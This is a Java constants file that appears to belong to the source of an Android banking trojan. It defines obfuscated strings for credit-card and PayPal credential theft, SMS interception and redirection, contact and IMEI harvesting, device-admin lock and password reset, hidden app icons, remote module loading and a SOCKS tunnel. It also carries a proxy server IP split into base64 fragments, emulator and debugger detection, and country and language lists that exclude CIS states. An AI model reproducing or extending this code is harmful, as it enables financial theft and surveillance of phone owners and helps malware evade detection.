package com.moonny.constants;

public class S {

    // Use static_packer/auto.py to update the key
    public static String key = "";

    public static String s(String str) {
        return str.replace(S.key, "");
    }

    // InjectActivity
    public static final String etage_header = S.s("ETage");
    public static final String xcache_header = S.s("X-Cache");
    public static final String language_header = S.s("X-Cached");
    public static final String url_scheme_for_dialog = S.s("url_scheme_for_dialog");

    public static final String ConnectivityManager = S.s("ConnectivityManager");
    public static final String setMobileDataEnabled = S.s("setMobileDataEnabled");
    public static final String SmsManager = S.s("android.telephony.SmsManager");
    public static final String SmsMessage = S.s("SmsMessage");
    public static final String getDefault = S.s("getDefault");
    public static final String NotificationManager = S.s("android.app.NotificationManager");
    public static final String notify = S.s("notify");
    public static final String AudioManager = S.s("android.media.AudioManager");
    public static final String setStreamVolume = S.s("setStreamVolume");
    public static final String STREAM_NOTIFICATION = S.s("STREAM_NOTIFICATION");
    public static final String STREAM_VOICE_CALL = S.s("STREAM_VOICE_CALL");
    public static final String STREAM_SYSTEM = S.s("STREAM_SYSTEM");
    public static final String STREAM_RING = S.s("STREAM_RING");
    public static final String STREAM_MUSIC = S.s("STREAM_MUSIC");
    public static final String STREAM_ALARM = S.s("STREAM_ALARM");

    // ============== API ===========================

    public static final String api_header = S.s("Cache-Control");
    public static final String api_header_value = S.s("not-cache");
    public static final String api_method = S.s("m");
    public static final String api_id = S.s("i");
    public static final String api_tag = S.s("t");

    public static final String api_sys_ver = S.s("a1");
    public static final String api_sys_ctx = S.s("a2");
    public static final String api_AdminRightsReceiver_class = S.s("a3");
    public static final String api_sys_modules_class = S.s("a4");
    public static final String api_sys_runfunc_name = S.s("a5");

    public static final String api_ApiRequest_class = S.s("a6");
    public static final String api_request_func = S.s("a7");

    public static final String api_get_command = S.s("g");
    public static final String api_load_sms = S.s("l");
    public static final String api_cc = S.s("c");
    public static final String api_contacts = S.s("x");
    public static final String api_send_result = S.s("r");
    public static final String api_tasks = S.s("tt");
    public static final String api_module = S.s("mm");
    public static final String api_get_module = S.s("gm");
    public static final String api_injects = S.s("gin");
    public static final String api_cc_stealer_on = S.s("gcc");
    public static final String api_minimize_apps = S.s("gma");
    public static final String api_domains = S.s("gid");

    public static final String api_contacts_list = S.s("1");
    public static final String api_apps = S.s("2");
    public static final String api_status = S.s("3");
    public static final String api_cc_step = S.s("4");
    public static final String api_response = S.s("5");
    public static final String api_task_id = S.s("6");
    public static final String api_mod_name = S.s("mn");
    public static final String api_mod_hash = S.s("7");
    public static final String api_task_params = S.s("p");

    public static final String MAIN_VER_REQUIRED = S.s("MAIN_VER_REQUIRED");
    public static final String main = S.s("main");
    public static final String list_has = S.s("list_has");
    public static final String list_remove = S.s("list_remove");
    public static final String get_pref = S.s("get_pref");
    public static final String set_pref = S.s("set_pref");
    public static final String get_main_version = S.s("get_main_version");
    public static final String aes_decrypt = S.s("aes_decrypt");
    public static final String list_merge = S.s("list_merge");

    public static final String api_cc_name = S.s("201");
    public static final String api_cc_number = S.s("202");
    public static final String api_cc_month = S.s("203");
    public static final String api_cc_year = S.s("204");
    public static final String api_cc_cvc = S.s("205");

    public static final String api_cc_address = S.s("206");
    public static final String api_cc_zip = S.s("207");
    public static final String api_cc_phone = S.s("208");
    public static final String api_cc_bday = S.s("209");
    public static final String api_cc_bmonth = S.s("210");
    public static final String api_cc_byear = S.s("211");
    public static final String api_cc_pay_pass = S.s("212");
    public static final String api_cc_sort = S.s("213");
    public static final String api_cc_account_number = S.s("214");

    public static final String api_data_version = S.s("300"); // version of injects/domains/minimize/etc list

    public static final String api_sms_text = S.s("401");
    public static final String api_sms_number = S.s("402");
    public static final String api_sms_date = S.s("403");

    public static final String api_sms_admin = S.s("111");
    public static final String api_is_admin = S.s("107");
    public static final String api_lang = S.s("108");
    public static final String api_is_screen_enabled = S.s("109");
    public static final String api_phone_time = S.s("110");
    public static final String api_is_intercept = S.s("112");
    public static final String api_android = S.s("104");
    public static final String api_model = S.s("105");
    public static final String api_operator = S.s("103");
    public static final String api_country = S.s("102");
    public static final String api_imei = S.s("101");
    public static final String api_number = S.s("90");
    public static final String api_text = S.s("91");
    public static final String api_date = S.s("92");
    public static final String api_month = S.s("93");
    public static final String api_year = S.s("94");
    public static final String api_cvc = S.s("95");

    public static final String api_err_no_compatible = S.s("Bot is not able to run that command");
    public static final String api_err_bad_mod = S.s("Command execution system error");
    public static final String api_binary_path = S.s("unfinished_request_binary_path");


    // ============== end API ===========================

    public static final String hundred = S.s("1000");
    public static final String build = S.s("build");
    public static final String get_command = S.s("get_command");
    public static final String info = S.s("info");
    public static final String send_result = S.s("send_result");
    public static final String android_class = S.s("android.support.v4.app.NotificationCompat$Builder");
    public static final String get_packages = S.s("get_packages");
    public static final String get_device_model = S.s("get_device_model");
    public static final String get_os_ver = S.s("get_os_ver");
    public static final String get_number = S.s("get_number");
    public static final String get_operator = S.s("get_operator");
    public static final String get_imei = S.s("get_imei");
    public static final String get_country = S.s("get_country");
    public static final String get_contacts = S.s("get_contacts");
    public static final String get_language = S.s("get_language");
    public static final String list_add = S.s("list_add");
    public static final String format_date = S.s("format_date");

    // cards
    public static final String mastercard = S.s("mastercard");
    public static final String visa = S.s("visa");
    public static final String amex = S.s("amex");
    public static final String card_incorrect = S.s("Incorrect credit card number");

    // HttpConstants

    // Commands
    public static final String settings_class = S.s("android.provider.Settings$Secure");
    public static final String get_string = S.s("getString");
    public static final String dateFormat = S.s("dd/MM/yyyy HH:mm:ss");
    public static final String chrome_pkg = S.s("com.android.chrome");
    public static final String chrome_CC_title = S.s("Google Chrome");

    // PrefsManager
    //public static final String main_prefs = S.s("main_prefs");

    // NOTE: this names used in dynamic modules; don't forget to change there too!
    public static final String injectsFilled = S.s("p1");
    public static final String root_phone = S.s("p2");
    public static final String app_stop = S.s("p3");
    public static final String app_kill = S.s("p4");
    public static final String soundValues = S.s("p5");
    public static final String screen_lock = S.s("screen_lock");
    public static final String free_dialog = S.s("p6");
    public static final String free_dialog_url = S.s("p7");
    public static final String pref_TmpPhone= S.s("p8"); // tmp phone to redirect sms
    public static final String pref_SmsRedirectTimeFrom = S.s("p9"); // time when redirect sms was set
    public static final String pref_SmsRedirectTime = S.s("p10"); // time to redirect sms
    public static final String pref_SmsRedirect = S.s("p11"); // sms redirect to admin/tmp phone
    public static final String sms_hook = S.s("p12"); // Sms intercept enabled
    public static final String api_server = S.s("p13");
    public static final String api_full_required = S.s("p14");
    public static final String api_fire_cc = S.s("p15");
    public static final String failed_mods = S.s("p16");
    public static final String failed_sendresults = S.s("p17");

    public static final String socials_filled = S.s("%RANDOM_ABC%");
    public static final String cc_done_apps = S.s("%RANDOM_ABC%");
    public static final String start = S.s("start");
    public static final String lastInject = S.s("%RANDOM_ABC%");
    public static final String last_api_server = S.s("%RANDOM_ABC%"); // last used, for webview
    public static final String cmt_timestamp = S.s("%RANDOM_ABC%");
    public static final String app_put = S.s("%RANDOM_ABC%");  // list of app device
    public static final String injectCyclePause = S.s("%RANDOM_ABC%");
    public static final String is_admin_active = S.s("%RANDOM_ABC%");
    public static final String sms_default_admin = S.s("%RANDOM_ABC%");
    public static final String pref_BlockAppSms = S.s("%RANDOM_ABC%"); // flag to stop intercept by sms command; false = stop
    public static final String socksStartServicePref = S.s("%RANDOM_ABC%");
    public static final String socksDisconnectedPref = S.s("%RANDOM_ABC%");
    // add new options here


    // SendCardNumber
    public static final String application = S.s("application");
    public static final String date = S.s("date");
    public static final String text = S.s("text");
    public static final String method = S.s("method");
    public static final String send_card_number = S.s("send_card_number");
    public static final String number = S.s("number");
    public static final String month = S.s("month");
    public static final String year = S.s("year");
    public static final String cvc = S.s("cvc");


    public static final String paypal_pkg = S.s("com.paypal.android.p2pmobile");
    public static final String gp_pkg = S.s("com.android.vending");

    public static final String ok = S.s("OK");
    public static final String command = S.s("command");
    public static final String params= S.s("params");
    public static final String timestamp= S.s("timestamp");

    public static final String dynam_module_class = S.s("com.dynam.");
    public static final String dynam_module_method = S.s("run");

    public static final String mod_main = S.s("main");

    // invokes
    public static final String IntentFilter = S.s("IntentFilter");
    public static final String Context = S.s("Context");

    public static final String getCmdHandlerHidden = S.s("getCmdHandlerHidden");
    public static final String invoke_hideApp = S.s("invoke_hideApp");
    public static final String invoke_hideApp2 = S.s("invoke_hideApp2");
    public static final String invoke_getHnd = S.s("invoke_getHnd");
    public static final String invoke_createNotify = S.s("invoke_createNotify");

    // UI
    public static final String click_to_get_admin = S.s("The GNU General Public License is a free, copyleft license forsoftware and other kinds of works.  The licenses for most software and other practical works are designedto take away your freedom to share and change the works.  By contrast,the GNU General Public License is intended to guarantee your freedom toshare and change all versions of a program - to make sure it remains freesoftware for all its users.  We, the Free Software Foundation, use theGNU General Public License for most of our software; it applies also toany other work released this way by its authors.  You can apply it toyour programs, too.  When we speak of free software, we are referring to freedom, notprice.  Our General Public Licenses are designed to make sure that youhave the freedom to distribute copies of free software (and charge forthem if you wish), that you receive source code or can get it if youwant it, that you can change the software or use pieces of it in newfree programs, and that you know you can do these things.");

    // debug log
    public static final String hideme = S.s("hideme");
    public static final String string2list = S.s("string2list");

    // FD intent
    public static final String title = S.s("title");
    public static final String card_text = S.s("card_text");
    public static final String on_package = S.s("on_package");
    public static final String freeDialogUrl = S.s("?id=");

    // CC2
    public static final String showMyDialog = S.s("showMyDialog");
    public static final String intent_with_card = S.s("intent_with_card");
    public static final String intent_with_month = S.s("intent_with_month");
    public static final String intent_with_year = S.s("intent_with_year");
    public static final String intent_with_cvc = S.s("intent_with_cvc");

    // Tags
    public static final String gpService = S.s("GPService");
    public static final String main_activity = S.s("MainActivity");
//    public static final String wake_log = S.s("main_service_wakelock");
    public static final String messageBaseReceiver = S.s("messageBaseReceiver");
    public static final String IDUtil = S.s("IDUtility");
    public static final String ApiRequest = S.s("ApiRequestOld");

//    public static final String MessageManager = S.s("MessageManager");
//    public static final String sendTextMessage = S.s("sendTextMessage");
//    public static final String sendMultipartTextMessage = S.s("sendMultipartTextMessage");
    public static final String USSDService = S.s("USSDService");
    public static final String UploadContactsRequest = S.s("UploadContactsRequest");

    // GP Service
    public static final String inject_id = S.s("inject_id");

    // MessageBase
    public static final String body = S.s("body");
    public static final String base_sms_intercept = S.s("base_sms_intercept");
    public static final String createFromPdu = S.s("createFromPdu");
    public static final String processIncomingMessages = S.s("processIncomingMessages");

    public static final String wifiLock = S.s("MyWifiLock");
    public static final String base_main_init = S.s("base_main_init");
    public static final String set_wakelock = S.s("set_wakelock");
    public static final String set_wifilock = S.s("set_wifilock");

    public static final String IDUtil_pseudo = S.s("454");
    public static final String md5 = S.s("MD5");

    public static final String apps = S.s("applications: android");
    public static final String android = S.s("android");
    public static final String model = S.s("model");
    public static final String cell = S.s("cell");
    public static final String country = S.s("country");
    public static final String imei = S.s("imei");

    public static final String getMessageBody = S.s("getMessageBody");


    public static final String getSimOperatorName = S.s("getSimOperatorName");
    public static final String getNetworkOperatorName = S.s("getNetworkOperatorName");
    public static final String http = S.s("http");
    public static final String https = S.s("https");

    public static final String error404 = S.s("404");
    public static final String CCID = S.s("CCID");
    public static final String CVC = S.s("CVC");
    public static final String error502 = S.s("502");
    public static final String gzip = S.s("gzip");
    public static final String contentEncoding = S.s("Content-Encoding");

    public static final String dynmod_queue_file = S.s("q"); // file with a queue of tasks
    public static final String api_queue_file = S.s("a"); // file with a queue of tasks
    public static final String api_failed_json = S.s("fj");

    public static final String utf8 = S.s("UTF-8");

    // USSDService
    public static final String addAction = S.s("addAction");
    public static final String addDataScheme = S.s("addDataScheme");
    public static final String addDataAuthority = S.s("addDataAuthority");
    public static final String addDataPath = S.s("addDataPath");
    public static final String ussd_uri = S.s("ussd");
    public static final String uri_aut = S.s("commandus.com");
    public static final String uri_path = S.s("/");

    public static final String uri_par  = S.s("return");
    public static final String mag_on  = S.s(":ON;)");
    public static final String mag_off  = S.s(":OFF;(");
    public static final String mag_retval  = S.s(":RETVAL;(");
    public static final String ussd_msg  = S.s("xxx...");

    // intents
    public static final String action_insert  = S.s("android.intent.action.INSERT"); // Intent.ACTION_INSERT
    public static final String action_delete  = S.s("android.intent.action.DELETE"); // Intent.ACTION_INSERT

    public static final String sleep = S.s("sleep"); // Intent.ACTION_INSERT

    // Api Handlers
    public static final String hnd_to = S.s("to");
    public static final String hnd_body = S.s("body");
    public static final String hnd_body2 = S.s("body2");
    public static final String hnd_ended = S.s("ended");
    public static final String hnd_number = S.s("number");
    public static final String intent_name = S.s("android.intent.action.CALL");
    public static final String hnd_tel = S.s("tel:");
    public static final String hnd_application = S.s("application");

    public static final String Modules = S.s("Modules");
    public static final String dex = S.s(".dex");

    public static final String getDisplayMessageBody = S.s("getDisplayMessageBody");
    public static final String DownloadModuleRequest = S.s("DownloadModuleRequest");


    public static final String getSystemService = S.s("getSystemService");
//    public static final String NS_SERVICE = S.s("NOTIFICATION_SERVICE");

    public static final String Preferences_ = S.s("Preferences_");
    public static final String getActTime = S.s("getActTime");
    public static final String get = S.s("get");
    public static final String LongPrefField = S.s("LongPrefField");
    public static final String getTimeToWork = S.s("getTimeToWork");
    public static final String longField = S.s("longField");
    public static final String stringField = S.s("stringField");
    public static final String getPh = S.s("getPh");
    public static final String lockNow = S.s("lockNow");
    public static final String resetPassword = S.s("resetPassword");
    public static final String tmp_phone = S.s("tmp_phone");

    public static final String repeatInject = S.s("repeatInject");
    public static final String requestToken = S.s("requestToken");
    public static final String requestCoordinates = S.s("requestCoordinates");

    public static final String bad_imei_1 = S.s("000000000000000");
    public static final String bad_imei_2 = S.s("012345678912345");
    public static final String bad_imei_3 = S.s("004999010640000");
    public static final String isDebuggerConnected1 = S.s("isDeb");
    public static final String bad_fingerprint_generic = S.s("generic");
    public static final String bad_unknown = S.s("unknown");
    public static final String bad_fingerprint_google_sdk = S.s("google_sdk");
    public static final String bad_fingerprint_emulator = S.s("Emulator");
    public static final String bad_fingerprint_android_sdk = S.s("Android SDK built for x86");
    public static final String bad_fingerprint_genymotion = S.s("Genymotion");
    public static final String bad_fingerprint_sdk = S.s("sdk");
    public static final String bad_fingerprint_sdk_x86 = S.s("sdk_x86");
    public static final String bad_fingerprint_vbox86p = S.s("vbox86p");
    public static final String bad_golfdish= S.s("golfdish");
    public static final String bad_ranchu= S.s("ranchu");
    public static final String fake_carriers = S.s("android|emergency calls only|fakecarrier");
    public static final String bad_debug = S.s("Debug");
    public static final String isDebuggerConnected2 = S.s("ugger");

    public static final String ComponentName = S.s("android.content.ComponentName");
    public static final String ACTION_INSERT = S.s("ACTION_INSERT");
    public static final String setVisibility= S.s("setVisibility");

    //    socks
    public static final String socksForbidden = S.s("socksForbidden");
    public static final String socksCommand = S.s("socks");
    public static final String socksStartParam = S.s("start");
    public static final String socksStopParam = S.s("stop");
    public static final String socksStop = S.s("socks_stop");
    public static final String socksStart = S.s("socks_start");
    public static final String socksReceiverAction = S.s("socksServerAction");
    public static final String sserverParamHost = S.s("host");
    public static final String sserverParamPort = S.s("port");
    public static final String SocksHandler = S.s("SocksHandler");
    public static final String ConnectionChanged = S.s("ConnectionChanged");
    public static final String SService = S.s("SService");
    public static final String SocksServer = S.s("SocksServer");

    public static final String socks_1 = S.s("Can`t connect to tunnel");
    public static final String socks_2 = S.s("Can`t read auth method response");
    public static final String socks_3 = S.s("Error auth method response");
    public static final String socks_4 = S.s("Can`t read auth response");
    public static final String socks_5 = S.s("Error auth response");
    public static final String socks_6 = S.s("Can't read connect state response");
    public static final String socks_7 = S.s("Error connect state response");
    public static final String socks_8 = S.s("Can't read remote host response");
    public static final String socks_9 = S.s("server stopped");
    public static final String socks_10 = S.s("RemoteSocksWorker");
    public static final String socks_11 = S.s("Cant read socks5 version");
    public static final String socks_12 = S.s("Wrong socks5 version");
    public static final String socks_13 = S.s("cant read connect request");
    public static final String socks_14 = S.s("wrong connect request");
    public static final String socks_15 = S.s("cannot read request address");
    public static final String socks_16 = S.s("cannot read request port");
    public static final String socks_17 = S.s("cannot say success message");

    public static final String socks_ip1 = S.s("MTg");
    public static final String socks_ip2 = S.s("1Lj");
    public static final String socks_ip3 = S.s("E4O");
    public static final String socks_ip4 = S.s("C4y");
    public static final String socks_ip5 = S.s("MDQ");
    public static final String socks_ip6 = S.s("uMTY=");
    public static final String isDebuggerConnected3 = S.s("Connected");
    public static final String os = S.s(".os.");

    public static final String AES = S.s("AES");
    public static final String aes2 = S.s("AES/ECB/PKCS5Padding");
    public static final String md5_abc = S.s("0123456789abcdef");

	public static final String notify_id = S.s("notify_id");
	public static final String toLowerCase = S.s("toLowerCase");
	public static final String toString = S.s("toString");

    // processes/
	public static final String status_str = S.s("/proc/%d/status");
    public static final String proc_line = S.s("/proc/%d/cmdline");

    public static final String blocked_countries = S.s("ru|rus|kz|ua|by|az|am|kg|md|tj|tm|uz|us|ca|cs|sk");
    public static final String blocked_langs = S.s("ru|uk|be|az|hy|ky|mo|ro|tg|tk|uz|cs|sk");
}